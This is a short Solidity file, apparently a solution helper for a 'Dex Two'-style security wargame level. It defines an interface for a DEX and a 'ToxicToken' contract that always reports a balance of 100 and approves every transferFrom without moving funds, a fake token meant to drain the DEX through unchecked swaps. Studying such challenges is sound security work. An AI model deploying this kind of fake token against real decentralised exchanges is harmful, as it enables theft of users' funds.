//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Dex2 {
    function token1() view external returns (address);
    function token2() view external returns (address);
    function swap(address from, address to, uint amount) external;
    function add_liquidity(address token_address, uint amount) external;
    function get_swap_price(address from, address to, uint amount) external view returns(uint);
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
}

contract ToxicToken {

  function balanceOf(address) external pure returns (uint) {
      return 100;
  }

  function transferFrom(address, address, uint) external pure returns (bool) {
      return true;
  }
}
